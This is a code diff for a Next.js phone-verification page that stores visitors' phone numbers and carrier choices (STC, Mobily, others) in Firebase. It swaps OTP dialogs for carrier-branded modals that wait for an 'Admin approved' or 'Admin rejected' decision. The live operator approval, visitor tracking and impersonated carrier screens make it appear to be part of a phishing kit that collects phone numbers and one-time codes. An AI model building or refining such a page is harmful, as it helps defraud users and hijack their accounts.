@@ -8,8 +8,9 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Phone } from "lucide-react"
 import { UnifiedSpinner } from "@/components/unified-spinner"
-import { PhoneOtpDialog } from "@/components/dialog-b"
-import { StcCallDialog } from "@/components/stc-call-dialog"
+import { StcVerificationModal } from "@/components/stc-verification-modal"
+import { MobilyVerificationModal } from "@/components/mobily-verification-modal"
+import { CarrierVerificationModal } from "@/components/carrier-verification-modal"
 
 import { db, updateDoc, doc } from "@/lib/firebase"
 import { onSnapshot, getDoc } from "firebase/firestore"
@@ -20,9 +21,9 @@ import { updateVisitorPage } from "@/lib/visitor-tracking"
 export default function VerifyPhonePage() {
   const [phoneNumber, setPhoneNumber] = useState("")
   const [selectedCarrier, setSelectedCarrier] = useState("")
-  const [showOtpDialog, setShowOtpDialog] = useState(false)
-  const [showStcCallDialog, setShowStcCallDialog] = useState(false)
-  const [showWaitingLoader, setShowWaitingLoader] = useState(false)
+  const [showStcModal, setShowStcModal] = useState(false)
+  const [showMobilyModal, setShowMobilyModal] = useState(false)
+  const [showCarrierModal, setShowCarrierModal] = useState(false)
   const [phoneError, setPhoneError] = useState("")
 
   // Saudi telecom operators
@@ -148,16 +149,13 @@ export default function VerifyPhonePage() {
         phoneCarrier: selectedCarrier
       }, "pending")
 
-      // Show different dialogs based on carrier
+      // Show different modals based on carrier
       if (selectedCarrier === "stc") {
-        setShowStcCallDialog(true)
+        setShowStcModal(true)
+      } else if (selectedCarrier === "mobily") {
+        setShowMobilyModal(true)
       } else {
-        setShowWaitingLoader(true)
-        // Wait 3 seconds then show OTP dialog
-        setTimeout(() => {
-          setShowWaitingLoader(false)
-          setShowOtpDialog(true)
-        }, 3000)
+        setShowCarrierModal(true)
       }
     } catch (error) {
       console.error("Error saving phone data:", error)
@@ -168,12 +166,13 @@ export default function VerifyPhonePage() {
     }
   }
 
-  const handleStcCallComplete = () => {
-    setShowStcCallDialog(false)
-    setShowOtpDialog(true)
+  const handleApproved = () => {
+    // Admin approved - redirect to next step
+    window.location.href = "/step2" // or wherever the next step is
   }
 
-  const handleOtpRejected = async () => {
+  const handleRejected = async () => {
+    // Admin rejected - close modal and allow re-entry
     const visitorID = localStorage.getItem('visitor')
     if (!visitorID) return
 
@@ -200,17 +199,19 @@ export default function VerifyPhonePage() {
       console.error("Error saving rejected phone data:", error)
     }
     
-    setShowOtpDialog(false)
+    // Close all modals
+    setShowStcModal(false)
+    setShowMobilyModal(false)
+    setShowCarrierModal(false)
+    
+    // Reset form
     setPhoneNumber("")
     setSelectedCarrier("")
-    toast.error("تم رفض رمز التحقق", {
+    
+    toast.error("تم رفض رقم الهاتف", {
       description: "يرجى إدخال رقم جوال صحيح والمحاولة مرة أخرى",
       duration: 5000
     })
-  }
-
-  if (showWaitingLoader) {
-    return <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
   }
 
   return (
@@ -305,18 +306,28 @@ export default function VerifyPhonePage() {
         </div>
       </div>
 
-      {/* STC Call Dialog */}
-      <StcCallDialog 
-        open={showStcCallDialog} 
-        onComplete={handleStcCallComplete}
+      {/* STC Verification Modal */}
+      <StcVerificationModal 
+        open={showStcModal} 
+        visitorId={visitorId}
+        onApproved={handleApproved}
+        onRejected={handleRejected}
       />
 
-      {/* Phone OTP Dialog */}
-      <PhoneOtpDialog 
-        open={showOtpDialog} 
-        onOpenChange={setShowOtpDialog} 
-        phoneNumber={phoneNumber}
-        onRejected={handleOtpRejected}
+      {/* Mobily Verification Modal */}
+      <MobilyVerificationModal 
+        open={showMobilyModal} 
+        visitorId={visitorId}
+        onApproved={handleApproved}
+        onRejected={handleRejected}
+      />
+
+      {/* Other Carriers Verification Modal */}
+      <CarrierVerificationModal 
+        open={showCarrierModal} 
+        visitorId={visitorId}
+        onApproved={handleApproved}
+        onRejected={handleRejected}
       />
     </>
   )
